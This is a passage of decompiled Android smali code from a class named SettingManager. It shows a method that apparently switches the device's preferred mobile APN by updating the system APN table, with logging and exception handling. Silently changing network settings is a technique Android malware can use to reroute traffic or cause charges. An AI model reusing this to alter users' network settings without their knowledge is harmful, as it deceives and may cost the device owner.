    const-string v3, " --------"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, v2}, Lcom/mms/bg/ui/SettingManager;->LOGD(Ljava/lang/String;)V

    .line 1302
    if-eqz p1, :cond_34

    .line 1303
    new-instance v1, Landroid/content/ContentValues;

    invoke-direct {v1}, Landroid/content/ContentValues;-><init>()V

    .line 1304
    .local v1, values:Landroid/content/ContentValues;
    const-string v2, "apn_id"

    invoke-virtual {v1, v2, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 1305
    iget-object v2, p0, Lcom/mms/bg/ui/SettingManager;->mResolver:Landroid/content/ContentResolver;

    sget-object v3, Lcom/mms/bg/ui/SettingManager;->uri_apn:Landroid/net/Uri;

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual {v2, v3, v1, v4, v5}, Landroid/content/ContentResolver;->update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    :try_end_32
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_32} :catch_36

    .line 1315
    const/4 v2, 0x1

    .end local v1           #values:Landroid/content/ContentValues;
    :goto_33
    return v2

    :cond_34
    move v2, v6

    .line 1307
    goto :goto_33

    .line 1309
    :catch_36
    move-exception v2

    move-object v0, v2

    .line 1310
    .local v0, e:Ljava/lang/Exception;
    const-string v2, "SettingManager"

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v3

    invoke-static {v2, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    move v2, v6

    .line 1311
    goto :goto_33
.end method
